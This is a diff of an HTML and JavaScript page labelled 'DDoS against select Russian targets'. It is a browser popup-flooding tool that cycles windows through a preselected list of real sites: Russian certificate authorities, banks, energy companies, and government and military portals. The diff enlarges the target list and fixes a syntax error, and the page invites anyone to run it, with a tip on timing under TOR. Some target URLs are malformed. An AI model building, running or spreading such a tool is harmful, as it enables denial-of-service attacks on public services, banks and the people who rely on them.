@@ -24,28 +24,26 @@
 <body>
 	<center><h1>DDoS against select Russian targets</h1></center>
 	<div id="container">
+		<p>Please allow popups for this file. This is the control file. In order to stop generating popups, kill this window, then you can close the others.</p>
 		<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> Open how many windows?</p>
-		<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds?</p>
+		<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds? TOR browser set to 30</p>
 		<button onclick="openURLs(); return false;">Start</button><br>
 		<button onclick="killAll(); return false;">Stop all</button> **Not functioning yet**<br>
 		<p>
-			THis is a quick and easy script that anyone can run in a browser. The targets are preselected (you can view them)
+			This is a quick and easy script that anyone can run in a browser. The targets are preselected (you can view them)
 		</p>
 	</div>
 </body>
 
 <script type="text/javascript">
 
-data ='{"url":["https://www.gazprom.ru","https://lukoil.ru","https://magnit.ru","https://www.nornickel.com","https://www.surgutneftegas.ru","https://www.tafneft.ru","https://www.evraz.com/ru","https://nlmk.com","https://www.sibur.ru","https://wwwseverstal.com","https://www.metalloinvest.com","https://nangs.org","https://rmk-group.ru/ru/","https://www.tmk-group.ru","https://ya.ru","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru","https://omk.ru/","https://www.sberbank.ru","https://www.vtb.ru","https://www.gszPrombank.ru","https://www.gosuslugi.ru","https://mos.ru/uslugi","https://kremlin.ru","https://government.ru","https://mil.ru","https://www.nalog.gov.ru","https://customs.gov.ru","https://pfr.gov.ru","https://rkn.gov.ru"]}'
+data ='{"url":["https://iecp.ru/ep/ep-verification","https://iecp.ru/ep/uc-list","https://uc-osnovanie.ru/","http://www.nucrf.ru","http://www.belinfonalog.ru","http://www.roseltorg.ru","http://www.astralnalog.ru","http://www.nwudc.ru","http://www.center-inform.ru","https://kk.bank/UdTs","http://structure.mil.ru/structure/uc/info.htm","http://www.ucpir.ru","http://dreamkas.ru","http://www.e-portal.ru","http://izhtender.ru","http://imctax.parus-s.ru","http://www.icentr.ru","http://www.kartoteka.ru","http://rsbis.ru/elektronnaya-podpis","http://www.stv-it.ru","http://www.crypset.ru","http://www.kt-69.ru","http://www.24ecp.ru","http://kraskript.com","http://ca.ntssoft.ru","http://www.y-center.ru","http://www.rcarus.ru","http://rk72.ru","http://squaretrade.ru","http://ca.gisca.ru","http://www.otchet-online.ru","http://udcs.ru","http://www.cit-ufa.ru","http://elkursk.ru","http://www.icvibor.ru","http://ucestp.ru","http://mcspro.ru","http://www.infotrust.ru","http://epnow.ru","http://ca.kamgov.ru","http://mascom-it.ru","http://cfmc.ru","https://www.gazprom.ru","https://lukoil.ru","https://magnit.ru","https://www.nornickel.com","https://www.surgutneftegas.ru","https://www.tafneft.ru","https://www.evraz.com/ru","https://nlmk.com","https://www.sibur.ru","https://wwwseverstal.com","https://www.metalloinvest.com","https://nangs.org","https://rmk-group.ru/ru/","https://www.tmk-group.ru","https://ya.ru","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru","https://omk.ru/","https://www.sberbank.ruhttps://www.vtb.ru","https://www.gszPrombank.ru","https://www.gosuslugi.ru","https://mos.ru/uslugi","https://kremlin.ru","https://government.ru","https://mil.ru","https://www.nalog.gov.ru","https://customs.gov.ru","https://pfr.gov.ru","https://rkn.gov.ru"]}'
 
 const dataobj = JSON.parse(data);
 var numWindows = 5;
 var dataIndex = 0;
 var windowlivesec = 10000;
 var dataLength = dataobj.url.length;
-console.log('dl',dataLength);
-
-console.log(dataobj);
 
 function getWindowCount() {
 	numWindows = $( "#windowcount" ).val();
@@ -64,7 +62,7 @@ function closeOnLoad(myLink)
                newWindow.close();
 							 openAnother();
              },
-             windowlivesec;
+             windowlivesec
             );
   };
 
